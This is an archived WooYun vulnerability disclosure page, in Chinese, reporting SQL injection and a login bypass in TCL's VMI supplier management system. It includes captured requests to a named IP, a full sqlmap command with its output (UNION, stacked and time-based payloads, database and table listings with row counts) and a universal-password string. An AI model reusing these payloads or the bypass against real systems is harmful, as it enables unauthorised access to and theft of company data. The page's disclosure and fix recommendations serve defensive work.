@@ -1,0 +1,790 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		TCL#某重要管理系统存在漏洞导致SQL注射及信息泄露  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		TCL#某重要管理系统存在漏洞导致SQL注射及信息泄露  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/Mr.leo">Mr.leo</a> 
+</li><li>提交时间：		2013-12-27 16:20</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-27：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-27：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-06：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-16：	细节向普通白帽子公开<br/>
+									2014-01-26：	细节向实习白帽子公开<br/>
+									2014-02-10：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">TCL#某重要管理系统存在漏洞导致SQL注射及信息泄露</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">站点：<br />
+<br />
+<br />
+<br />
+http://srm.tclking.com/ TCL VMI（供应商管理库存）管理系统<br />
+<br />
+<br />
+<br />
+登录处用户名密码没有过滤，导致注射。不过当我用burp抓包的时候，蛋碎了。。 post的提交方式sqlmap和其他注入工具都不能识别。无奈我找了基友问小胖子的联系方式，想用中转的方法再试一下，可等了1个上午，基友没有回复，只能自己找找还有没有其他突破口了。<br />
+<br />
+<br />
+<br />
+POST http://59.33.249.38/vmi/WebService/WS_Login.asmx/Login HTTP/1.1<br />
+<br />
+Host: 59.33.249.38<br />
+<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0<br />
+<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+<br />
+Accept-Encoding: gzip, deflate<br />
+<br />
+Content-Type: application/json; charset=utf-8<br />
+<br />
+Referer: http://59.33.249.38/<br />
+<br />
+Content-Length: 37<br />
+<br />
+Connection: keep-alive<br />
+<br />
+Pragma: no-cache<br />
+<br />
+Cache-Control: no-cache<br />
+<br />
+<br />
+<br />
+{&quot;Account&quot;:&quot;vmieip&quot;,&quot;PassWord&quot;:&quot;123&quot;}<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+终于通过目录查找到这个URL，此URL提供一个测试调用的功能，正好也试试看用BURP抓包是什么效果 http://59.33.249.38/vmi/WebService/WS_Login.asmx?op=Login<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/271545596fe985288996b12fa60ebcea9a46d982.png" target="_blank"><img src="../images/271545596fe985288996b12fa60ebcea9a46d982.png" alt="112233.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+burp抓包如下：<br />
+<br />
+POST http://59.33.249.38/vmi/WebService/WS_Login.asmx/Login HTTP/1.1<br />
+<br />
+Host: 59.33.249.38<br />
+<br />
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:18.0) Gecko/20100101 Firefox/18.0<br />
+<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br />
+<br />
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3<br />
+<br />
+Accept-Encoding: gzip, deflate<br />
+<br />
+Referer: http://59.33.249.38/vmi/WebService/WS_Login.asmx?op=Login<br />
+<br />
+Connection: keep-alive<br />
+<br />
+Content-Type: application/x-www-form-urlencoded<br />
+<br />
+Content-Length: 24<br />
+<br />
+<br />
+<br />
+Account=123&amp;PassWord=123<br />
+<br />
+<br />
+<br />
+嘿嘿，这下提交的post参数，sqlmap可以识别了，问题就这么解开了。<br />
+<br />
+<br />
+<br />
+URL链接往下看，实例中的确是支持GET和POST两种方式提交的。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/27154817dadcbf53445272962c30d2b35a3597f0.png" target="_blank"><img src="../images/27154817dadcbf53445272962c30d2b35a3597f0.png" alt="5555555555.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+接下来就让sqlmap跑起来<br />
+<br />
+<br />
+<br />
+sqlmap.py -u &quot;http://59.33.249.38/vmi/WebService/WS_Login.asmx/Login&quot; --data &quot;Account=123&amp;PassWord=123&quot; -p &quot;Account&quot; --dbs --current-user --current-db<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+[root@Hacker~]# Sqlmap sqlmap.py -u &quot;http://59.33.249.38/vmi/WebService/WS_Login<br />
+<br />
+.asmx/Login&quot; --data &quot;Account=123&amp;PassWord=123&quot; -p &quot;Account&quot; --dbs --current-user<br />
+<br />
+ --current-db<br />
+<br />
+<br />
+<br />
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool<br />
+<br />
+    http://sqlmap.org<br />
+<br />
+<br />
+<br />
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual<br />
+<br />
+ consent is illegal. It is the end user&#039;s responsibility to obey all applicable<br />
+<br />
+local, state and federal laws. Developers assume no liability and are not respon<br />
+<br />
+sible for any misuse or damage caused by this program<br />
+<br />
+<br />
+<br />
+[*] starting at 15:49:09<br />
+<br />
+<br />
+<br />
+[15:49:09] [INFO] resuming back-end DBMS &#039;microsoft sql server&#039;<br />
+<br />
+[15:49:09] [INFO] testing connection to the target url<br />
+<br />
+sqlmap identified the following injection points with a total of 0 HTTP(s) reque<br />
+<br />
+sts:<br />
+<br />
+---<br />
+<br />
+Place: POST<br />
+<br />
+Parameter: Account<br />
+<br />
+    Type: UNION query<br />
+<br />
+    Title: Generic UNION query (NULL) - 19 columns<br />
+<br />
+    Payload: Account=123&#039; UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, N<br />
+<br />
+ULL, CHAR(58)+CHAR(107)+CHAR(98)+CHAR(112)+CHAR(58)+CHAR(116)+CHAR(122)+CHAR(122<br />
+<br />
+)+CHAR(89)+CHAR(66)+CHAR(111)+CHAR(68)+CHAR(111)+CHAR(120)+CHAR(116)+CHAR(58)+CH<br />
+<br />
+AR(107)+CHAR(101)+CHAR(99)+CHAR(58), NULL, NULL, NULL, NULL, NULL, NULL, NULL, N<br />
+<br />
+ULL, NULL, NULL, NULL-- &amp;PassWord=123<br />
+<br />
+<br />
+<br />
+    Type: stacked queries<br />
+<br />
+    Title: Microsoft SQL Server/Sybase stacked queries<br />
+<br />
+    Payload: Account=123&#039;; WAITFOR DELAY &#039;0:0:5&#039;;--&amp;PassWord=123<br />
+<br />
+<br />
+<br />
+    Type: AND/OR time-based blind<br />
+<br />
+    Title: Microsoft SQL Server/Sybase time-based blind<br />
+<br />
+    Payload: Account=123&#039; WAITFOR DELAY &#039;0:0:5&#039;--&amp;PassWord=123<br />
+<br />
+---<br />
+<br />
+[15:49:09] [INFO] the back-end DBMS is Microsoft SQL Server<br />
+<br />
+web server operating system: Windows 2008<br />
+<br />
+web application technology: ASP.NET, Microsoft IIS 7.5, ASP.NET 2.0.50727<br />
+<br />
+back-end DBMS: Microsoft SQL Server 2008<br />
+<br />
+[15:49:09] [INFO] fetching current user<br />
+<br />
+current user:    &#039;vmieip&#039;<br />
+<br />
+[15:49:09] [INFO] fetching current database<br />
+<br />
+current database:    &#039;EIP&#039;<br />
+<br />
+[15:49:09] [INFO] fetching database names<br />
+<br />
+[15:49:09] [INFO] the SQL query used returns 7 entries<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;EIP&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;master&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;model&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;msdb&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;ReportServer&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;ReportServerTempDB&quot;<br />
+<br />
+[15:49:09] [INFO] resumed: &quot;tempdb&quot;<br />
+<br />
+available databases [7]:<br />
+<br />
+[*] EIP<br />
+<br />
+[*] master<br />
+<br />
+[*] model<br />
+<br />
+[*] msdb<br />
+<br />
+[*] ReportServer<br />
+<br />
+[*] ReportServerTempDB<br />
+<br />
+[*] tempdb<br />
+<br />
+<br />
+<br />
+Database: EIP<br />
+<br />
+[88 tables]<br />
+<br />
++----------------------------+<br />
+<br />
+| dbo.EIP_Custmast           |<br />
+<br />
+| dbo.H_Vmi_ocsuppar         |<br />
+<br />
+| dbo.H_Vmi_ocsupparmast     |<br />
+<br />
+| dbo.H_Vmi_tgbom            |<br />
+<br />
+| dbo.H_Vmi_vmibom           |<br />
+<br />
+| dbo.HorizontalPlan         |<br />
+<br />
+| dbo.IN_ProBase             |<br />
+<br />
+| dbo.IN_Supplier            |<br />
+<br />
+| dbo.IN_WHInCome            |<br />
+<br />
+| dbo.In_WHInComeDetail      |<br />
+<br />
+| dbo.OA_Account             |<br />
+<br />
+| dbo.OA_AccountRight        |<br />
+<br />
+| dbo.OA_DocuMentList        |<br />
+<br />
+| dbo.OA_MainDocuMent        |<br />
+<br />
+| dbo.Oa_Position            |<br />
+<br />
+| dbo.Oa_RightMast           |<br />
+<br />
+| dbo.PlanCtv                |<br />
+<br />
+| dbo.PlanDocumno            |<br />
+<br />
+| dbo.SM_OABusFlow           |<br />
+<br />
+| dbo.SM_TreeTest            |<br />
+<br />
+| dbo.SM_UserMast            |<br />
+<br />
+| dbo.VMI_ActFlow            |<br />
+<br />
+| dbo.VMI_Base               |<br />
+<br />
+| dbo.VMI_JudgeInfo          |<br />
+<br />
+| dbo.VMI_TempTable          |<br />
+<br />
+| dbo.VMI_facshop            |<br />
+<br />
+| dbo.VMI_orderseq           |<br />
+<br />
+| dbo.VMI_prOCBOMdetail      |<br />
+<br />
+| dbo.VMI_prOCBOMdetail_temp |<br />
+<br />
+| dbo.Vmi_EmailRemind        |<br />
+<br />
+| dbo.Vmi_Forecast           |<br />
+<br />
+| dbo.Vmi_ForecastM          |<br />
+<br />
+| dbo.Vmi_Modelmast          |<br />
+<br />
+| dbo.Vmi_OCProcess          |<br />
+<br />
+| dbo.Vmi_OCRemote           |<br />
+<br />
+| dbo.Vmi_OcClearFlag        |<br />
+<br />
+| dbo.Vmi_PRLog              |<br />
+<br />
+| dbo.Vmi_PartArrival        |<br />
+<br />
+| dbo.Vmi_RecentPlan         |<br />
+<br />
+| dbo.Vmi_RecentPlanM        |<br />
+<br />
+| dbo.Vmi_SendIF             |<br />
+<br />
+| dbo.Vmi_autoRunLog         |<br />
+<br />
+| dbo.Vmi_dayplan            |<br />
+<br />
+| dbo.Vmi_dayplanM           |<br />
+<br />
+| dbo.Vmi_dayplandetail      |<br />
+<br />
+| dbo.Vmi_itemcontrol        |<br />
+<br />
+| dbo.Vmi_itemmast           |<br />
+<br />
+| dbo.Vmi_itemtemp           |<br />
+<br />
+| dbo.Vmi_line_cn            |<br />
+<br />
+| dbo.Vmi_mcbalance          |<br />
+<br />
+| dbo.Vmi_mcstock            |<br />
+<br />
+| dbo.Vmi_mcsuppar           |<br />
+<br />
+| dbo.Vmi_ocsuppar           |<br />
+<br />
+| dbo.Vmi_ocsupparmast       |<br />
+<br />
+| dbo.Vmi_partrep            |<br />
+<br />
+| dbo.Vmi_prdetail           |<br />
+<br />
+| dbo.Vmi_prmaster           |<br />
+<br />
+| dbo.Vmi_reqdetail          |<br />
+<br />
+| dbo.Vmi_reqmast            |<br />
+<br />
+| dbo.Vmi_supmast            |<br />
+<br />
+| dbo.Vmi_tebom              |<br />
+<br />
+| dbo.Vmi_tebombak           |<br />
+<br />
+| dbo.Vmi_tgbom              |<br />
+<br />
+| dbo.Vmi_txndetail          |<br />
+<br />
+| dbo.Vmi_txndetailh         |<br />
+<br />
+| dbo.Vmi_txnhead            |<br />
+<br />
+| dbo.Vmi_txnheadh           |<br />
+<br />
+| dbo.Vmi_userSsec           |<br />
+<br />
+| dbo.Vmi_userwsec           |<br />
+<br />
+| dbo.Vmi_vmibom             |<br />
+<br />
+| dbo.Vmi_vmibombak          |<br />
+<br />
+| dbo.Vmi_whsmast            |<br />
+<br />
+| dbo.Vmi_zhs_list           |<br />
+<br />
+[15:49:32] [WARNING] cannot properly display Unicode characters insi<br />
+<br />
+S command prompt (http://bugs.python.org/issue1602). All unhandled o<br />
+<br />
+ll result in replacement with &#039;?&#039; character. Please, find proper cha<br />
+<br />
+sentation inside corresponding output files.<br />
+<br />
+| dbo.[????$]                    |<br />
+<br />
+| dbo.hr_dept                |<br />
+<br />
+| dbo.pbcatcol               |<br />
+<br />
+| dbo.pbcatedt               |<br />
+<br />
+| dbo.pbcatfmt               |<br />
+<br />
+| dbo.pbcattbl               |<br />
+<br />
+| dbo.pbcatvld               |<br />
+<br />
+| dbo.sysdiagrams            |<br />
+<br />
+| dbo.temp_OcnoHead          |<br />
+<br />
+| dbo.vmi_OCPartSub          |<br />
+<br />
+| dbo.vmi_dayplandetail2     |<br />
+<br />
+| dbo.vmi_dayplandetail_bak  |<br />
+<br />
+| dbo.vmi_octest             |<br />
+<br />
+| dbo.vmi_tempJX             |<br />
+<br />
+| dbo.vmi_transstock         |<br />
+<br />
++----------------------------+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+数据量是非常大的。。。。<br />
+<br />
+Database: EIP<br />
+<br />
++----------------------------+---------+<br />
+<br />
+| Table                      | Entries |<br />
+<br />
++----------------------------+---------+<br />
+<br />
+| dbo.Vmi_dayplandetail      | 14963366 |<br />
+<br />
+| dbo.Vmi_prdetail           | 7418284 |<br />
+<br />
+| dbo.VMI_prOCBOMdetail_temp | 6879086 |<br />
+<br />
+| dbo.Vmi_txndetailh         | 6063248 |<br />
+<br />
+| dbo.H_Vmi_tgbom            | 4200966 |<br />
+<br />
+| dbo.vmi_dayplandetail_bak  | 4103028 |<br />
+<br />
+| dbo.H_Vmi_ocsupparmast     | 3176691 |<br />
+<br />
+| dbo.H_Vmi_vmibom           | 2366506 |<br />
+<br />
+| dbo.Vmi_txnheadh           | 1269406 |<br />
+<br />
+| dbo.H_Vmi_ocsuppar         | 1156932 |<br />
+<br />
+| dbo.Vmi_mcbalance          | 632422  |<br />
+<br />
+| dbo.Vmi_RecentPlan         | 538523  |<br />
+<br />
+| dbo.Vmi_reqdetail          | 520720  |<br />
+<br />
+| dbo.VMI_JudgeInfo          | 511320  |<br />
+<br />
+| dbo.Vmi_tgbom              | 341663  |<br />
+<br />
+| dbo.Vmi_tebom              | 313933  |<br />
+<br />
+| dbo.Vmi_ocsupparmast       | 235631  |<br />
+<br />
+| dbo.Vmi_dayplan            | 191546  |<br />
+<br />
+| dbo.Vmi_vmibom             | 189565  |<br />
+<br />
+| dbo.Vmi_tebombak           | 133795  |<br />
+<br />
+| dbo.Vmi_vmibombak          | 130078  |<br />
+<br />
+| dbo.VMI_prOCBOMdetail      | 127743  |<br />
+<br />
+| dbo.VMI_orderseq           | 87835   |<br />
+<br />
+| dbo.Vmi_userwsec           | 79650   |<br />
+<br />
+| dbo.Vmi_Forecast           | 68069   |<br />
+<br />
+| dbo.Vmi_ocsuppar           | 63024   |<br />
+<br />
+| dbo.Vmi_txnhead            | 54471   |<br />
+<br />
+| dbo.Vmi_mcstock            | 47551   |<br />
+<br />
+| dbo.Vmi_itemmast           | 30474   |<br />
+<br />
+| dbo.Vmi_userSsec           | 26895   |<br />
+<br />
+| dbo.Vmi_autoRunLog         | 23786   |<br />
+<br />
+| dbo.Vmi_zhs_list           | 23617   |<br />
+<br />
+| dbo.Vmi_mcsuppar           | 21776   |<br />
+<br />
+| dbo.Vmi_OcClearFlag        | 21356   |<br />
+<br />
+| dbo.Vmi_line_cn            | 10038   |<br />
+<br />
+| dbo.OA_AccountRight        | 8556    |<br />
+<br />
+| dbo.Vmi_PartArrival        | 7583    |<br />
+<br />
+| dbo.Vmi_PRLog              | 7576    |<br />
+<br />
+| dbo.Vmi_SendIF             | 7201    |<br />
+<br />
+| dbo.Vmi_itemtemp           | 6963    |<br />
+<br />
+| dbo.Vmi_Modelmast          | 3867    |<br />
+<br />
+| dbo.Vmi_EmailRemind        | 3636    |<br />
+<br />
+| dbo.VMI_Base               | 3005    |<br />
+<br />
+| dbo.vmi_octest             | 2727    |<br />
+<br />
+| dbo.Vmi_dayplanM           | 2586    |<br />
+<br />
+| dbo.Vmi_OCRemote           | 2199    |<br />
+<br />
+| dbo.vmi_transstock         | 1373    |<br />
+<br />
+| dbo.Vmi_reqmast            | 1051    |<br />
+<br />
+| dbo.vmi_tempJX             | 919     |<br />
+<br />
+| dbo.Vmi_itemcontrol        | 836     |<br />
+<br />
+| dbo.Vmi_RecentPlanM        | 817     |<br />
+<br />
+| dbo.Vmi_whsmast            | 404     |<br />
+<br />
+| dbo.OA_Account             | 381     |<br />
+<br />
+| dbo.vmi_OCPartSub          | 349     |<br />
+<br />
+| dbo.hr_dept                | 300     |<br />
+<br />
+| dbo.Oa_Position            | 264     |<br />
+<br />
+| dbo.Vmi_prmaster           | 239     |<br />
+<br />
+| dbo.Vmi_ForecastM          | 174     |<br />
+<br />
+| dbo.PlanDocumno            | 173     |<br />
+<br />
+| dbo.Vmi_OCProcess          | 167     |<br />
+<br />
+| dbo.Vmi_supmast            | 139     |<br />
+<br />
+| dbo.temp_OcnoHead          | 90      |<br />
+<br />
+| dbo.Oa_RightMast           | 83      |<br />
+<br />
+| dbo.[仓位信息$]                    | 66      |<br />
+<br />
+| dbo.Vmi_partrep            | 35      |<br />
+<br />
+| dbo.pbcatedt               | 21      |<br />
+<br />
+| dbo.pbcatfmt               | 20      |<br />
+<br />
+| dbo.IN_Supplier            | 11      |<br />
+<br />
+| dbo.IN_WHInCome            | 11      |<br />
+<br />
+| dbo.Vmi_txndetail          | 9       |<br />
+<br />
+| dbo.EIP_Custmast           | 6       |<br />
+<br />
+| dbo.IN_ProBase             | 4       |<br />
+<br />
+| dbo.In_WHInComeDetail      | 4       |<br />
+<br />
+| dbo.VMI_ActFlow            | 4       |<br />
+<br />
+| dbo.OA_DocuMentList        | 3       |<br />
+<br />
+| dbo.OA_MainDocuMent        | 3       |<br />
+<br />
+| dbo.SM_UserMast            | 3       |<br />
+<br />
+| dbo.SM_OABusFlow           | 2       |<br />
+<br />
+| dbo.SM_TreeTest            | 2       |<br />
+<br />
++----------------------------+---------+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/271551192a1ac1c723c7ed9002d7715f0e7c9f9f.png" target="_blank"><img src="../images/271551192a1ac1c723c7ed9002d7715f0e7c9f9f.png" alt="666666666666.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+既然有SQL注射漏洞了，那登录界面也存在万能密码漏洞<br />
+<br />
+<br />
+<br />
+用户名admin 密码&#039; or 1=1 or &#039;&#039;=&#039; 或者用户名密码同为&#039; or 1=1 or &#039;&#039;=&#039; 只测试一个实例，其他万能密码请厂商自己检查。<br />
+<br />
+<br />
+<br />
+登录成功的界面截图一张，over<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/271556242c1e3d340cf29b522318ecb7be632e4f.png" target="_blank"><img src="../images/271556242c1e3d340cf29b522318ecb7be632e4f.png" alt="77777777777777.png" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">已经证明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1、过滤get和post两种方式的SQL注射<br />
+<br />
+<br />
+<br />
+2、修复万能密码<br />
+<br />
+<br />
+<br />
+3、屏蔽不必要的列目录 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/Mr.leo" title="Mr.leo">Mr.leo</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-047173" title="TCL#某重要管理系统存在漏洞导致SQL注射及信息泄露">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-12-27 16:26</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢你的关注，已转发相关单位确认处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="47173";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
